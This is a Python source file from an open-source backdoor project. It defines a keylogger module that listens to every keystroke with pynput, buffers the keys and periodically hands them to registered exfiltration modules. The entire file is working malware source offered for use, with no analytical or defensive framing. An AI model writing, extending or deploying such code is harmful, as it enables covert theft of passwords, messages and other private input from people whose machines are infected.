#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

import contextlib
from threading import Timer

from pynput.keyboard import Key, Listener

from src.modules.exploitation.base import ExploitationModule


class KeyLogger(ExploitationModule):
    def __init__(self, *,
                 start_message: str = "Keylogger Initialized",
                 exfil_time: [int, float]):
        """Set up a keyboard listener that monitors keystroke events
        and send them to pre-configured exfiltration methods.

        Args:
            exfil_time (int,float): Time in seconds to wait before
                executing the exfiltration of logged keystrokes.
        """

        super().__init__()
        self.exfil_buffer: list[str] = [start_message]
        self.exfil_time = exfil_time
        '''Mapping of key names to string characters for human-readable 
        text output. Add more mappings as necessary depending on the 
        host and the character set it works with.'''
        self.key_mapping: dict[str: str] = {"space": " "}

    def _notify_all_exfiltrators(self) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        message: str = self.report()
        [exfiltrator.update(message) for exfiltrator in self._exfiltrators]
        Timer(interval=self.exfil_time,
              function=self._notify_all_exfiltrators).start()
        self.exfil_buffer.clear()

    @property
    def contents(self) -> str:
        return "".join(self.exfil_buffer)

    @property
    def has_data(self) -> bool:
        return bool(len(self.exfil_buffer))

    def _on_press(self, key: Key) -> None:
        """Add the string representation of each keystroke captured
        'on press' by the listener thread to the exfiltration buffer."""
        try:  # A key was pressed and caught by the listener
            pressed_key: str = key.char  # The key is alphanumeric
        except AttributeError:  # The key is special
            try:  # Translate the key's value through custom mapping...
                pressed_key = self.key_mapping[key.name]
            except KeyError:  # ... or use the key's name as a result
                try:  # The special key is valid and has a name...
                    pressed_key = f"[{key.name.upper()}]"
                except AttributeError:  # ... or is unknown
                    pressed_key = "[???]"
        self.exfil_buffer.append(pressed_key)

    def _on_release(self, key: Key) -> None:
        pass

    def execute(self) -> None:
        """Start the keylogger, capture keyboard events and notify all
        registered exfiltrators."""
        with Listener(on_press=self._on_press,
                      on_release=self._on_release) as listener:
            with contextlib.suppress(KeyboardInterrupt):
                self._notify_all_exfiltrators()
                listener.join()
